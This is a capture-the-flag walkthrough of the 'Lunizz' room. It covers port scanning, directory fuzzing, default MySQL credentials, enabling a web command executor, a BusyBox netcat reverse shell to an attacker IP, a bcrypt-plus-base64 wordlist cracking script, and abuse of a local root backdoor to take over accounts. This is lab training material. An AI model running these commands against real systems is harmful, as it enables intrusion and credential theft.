# Room: Lunizz CTF

Difficulty: Medium

## Reconnaissance

First thing first when doing pentesting, I ran nmap to scan for open ports.

Command: 
``` bash
nmap -sC -sV TARGET_IP
```
Explanation: 
- -sC for default scripts
- -sV for version detection

Result:
``` bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 54:b5:a8:20:b6:a6:40:5b:04:2a:b8:d7:c7:22:c3:92 (RSA)
|   256 17:06:89:0c:5f:17:3d:fa:85:1f:a8:54:3e:c2:99:9d (ECDSA)
|_  256 02:95:d2:b6:ca:f7:30:5b:ed:ba:23:40:4a:ae:30:6d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.20.04.1
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, LongColumnFlag, ODBCClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, IgnoreSigpipes, FoundRows, ConnectWithDatabase, InteractiveClient, LongPassword, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ]\x0BRL\x1B\x13\x1B\x10B\x01&\x13\x15\x18/[\x13\x1Cc9
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-02-11T23:12:30
|_Not valid after:  2031-02-09T23:12:30
4444/tcp open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     cmFuZG9tcGFzc3dvcmQ=
|     Wrong Password
|   NULL: 
|     Can you decode this for me?
|     cmFuZG9tcGFzc3dvcmQ=
|   SSLSessionReq: 
|     Can you decode this for me?
|_    cEBzc3dvcmQ=
5000/tcp open  upnp?
...
```
## Service 4444 Analysis

Upon reviewing the result, I found a Base64-encoded string:
``` bash
cmFuZG9tcGFzc3dvcmQ=
cEBzc3dvcmQ=
```
Decoded values:
``` bash
cmFuZG9tcGFzc3dvcmQ= = randompassword
cEBzc3dvcmQ= = p@ssword
```
I then accessed port 4444 using Netcat.

Command:
``` bash
nc TARGET_IP 4444
```

Result:
``` bash
Can you decode this for me?
bGV0bWVpbg==
letmein # decoded 
root@lunizz:#
```
However, when I tried to execute commands, it returned a fatal error.

## Web Enumeration (Port 80)

I investigated port 80. It showed a default Apache page. I then used ffuf to enumerate hidden directories.
Command:
``` bash
ffuf -u http://TARGET_IP/FUZZ -w wordlist.txt
```
Result:
```
hidden
whatever
```
## "hidden" Directory - Upload Page

Inside /hidden, there was a file upload page.

## Observations:
``` html
Only JPG, JPEG, PNG, and GIF files are allowed
```
Uploaded files were stored in /hidden/uploads
Directory access was forbidden

## “whatever” Directory

The /whatever directory contained a command execution page.

Result:
``` html
Command Executer Mode: 0
```
I attempted a reverse shell, but it failed.

## Further Enumeration

I re-enumerated hidden directories and included .php and .txt extensions.

Result:
``` bash
Instructions.txt
```
## Contents of Instructions.txt:
``` bash
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our CTF script

# Steps
- Create a MySQL user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done, you can start using CTF script

# Notes
Please do not use default creds (IT'S DANGEROUS)
```
## MySQL Access

We now have the MySQL default credentials.

I logged into MySQL using:
``` bash
mysql -h TARGET_IP -u runcheck -p --skip-ssl
```
## Database Enumeration
``` bash
MySQL [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| runornot           |
+--------------------+

MySQL [runornot]> show tables;

+----------------+
| Tables_in_runornot |
+----------------+
| runcheck        |
+----------------+

MySQL [runornot]> SELECT * FROM runcheck;

+------+
| run  |
+------+
| 0    |
+------+
```
## Privilege Trigger

Since the command executor was disabled, I tried modifying the value:
``` bash
UPDATE runcheck SET run = 1;

Result:
Query OK, 1 row affected

SELECT * FROM runcheck;

+------+
| run  |
+------+
| 1    |
+------+
```
Command Executor mode changed:
- Before: Mode 0 (locked mode)

- After: Mode 1 (execution allowed)

I executed a command:
``` bash
ls
```
It displayed:
``` html
config.php
```
## Reverse Shell

I executed a reverse shell using BusyBox

Listener:
``` bash
nc -lvnp 4444
```
``` bash
busybox nc YOUR_IP 4444 -e /bin/bash
```
Result:
``` bash
connect to [YOUR_IP] from (UNKNOWN) [10.49.163.56]
whoami
www-data
```
Privilege Escalation Enumeration

Inside /home, I found two users:
``` bash
adam
mason
```
I uploaded and ran linpeas and discovered:

- Internal service running on 127.0.0.1:8080

## Mason Backdoor
``` bash
curl 127.0.0.1:8080

Mason's Root Backdoor
Please send request (password and cmdtype)
```
Supported commands:

- lsla
- reboot
- passwd

Attempted request:
``` bash
curl -X POST http://127.0.0.1:8080 -d "password=test&cmdtype=lsla"
```
Result:
``` bash
Wrong Password [your place ;)]!!
```
Since I don't have the password, I explore again.

## Adam Directory Analysis

Inside /proct, owned by Adam, I found:
``` bash
bcrypt_encryption.py
```

bcrypt_encryption.py:
``` bash
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()

```
Target hash:
``` bash
$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e
```
This was interesting because Adam’s script was encoding the plaintext password into Base64 first, then hashing it using bcrypt.
Since we have the hashAndSalt, I used AI to help me create a Python script.

cracker.py:
``` python
import bcrypt
import base64
import sys

target_hash = b"$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

def crack_bcrypt():
    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            print(f"[*] Starting crack attempt on hash: {target_hash.decode()}")
            
            for line in f:
                password = line.strip()
                b64_password = base64.b64encode(password.encode('ascii'))
                
                if bcrypt.checkpw(b64_password, target_hash):
                    print(f"\n[+] MATCH FOUND!")
                    print(f"[+] Password: {password}")
                    return
                
                if sys.stdout.isatty():
                    print(f"[*] Testing: {password}", end="\r")

            print("\n[-] Password not found in wordlist.")
            
    except FileNotFoundError:
        print(f"[-] Error: Wordlist not found at {wordlist_path}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    crack_bcrypt()
```
Explanation:

We cannot directly use hashcat or John the Ripper because they compare against plaintext.
So we need to encode every password in the wordlist to Base64 first, then check if it matches the bcrypt hash.

Flow: 
```
password → base64 → bcrypt_check
```
Example:
``` 
Admin → YWRtaW4 → bcrypt compare
```
If it matches
```
bcrypt.checkpw(b64_password, target_hash)
```

## Password Found:
``` bash
bowwow
```
## Switching to Adam

Now I am Adam.

Inside /home/adam/Desktop/.archive:
``` bash
To_my_best_friend_adam.txt
```
Content:
``` bash
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
```
I checked the Google Maps link and it pointed to Northern Lights.

## Mason Backdoor Exploitation
Earlier the Mason’s backdoor showed the password hint when I tried using wrong password
``` bash
Wrong Password [your place ;)]!!
```
Maybe the password was the northern lights?
``` bash
curl -X POST http://127.0.0.1:8080 -d "password=northernlights&cmdtype=passwd"
```
Result:
``` bash
Password Changed To: northernlights
```
It works!

## Final Access

Login as Mason:
``` bash
mason:northernlights
```
I grabbed the user flag:
``` bash
/home/mason/user.txt
```

I also tried accessing root using:
``` bash
root:northernlights
```
and it also works!

I grabbed the root flag:
``` bash
/root/r00t.txt
```

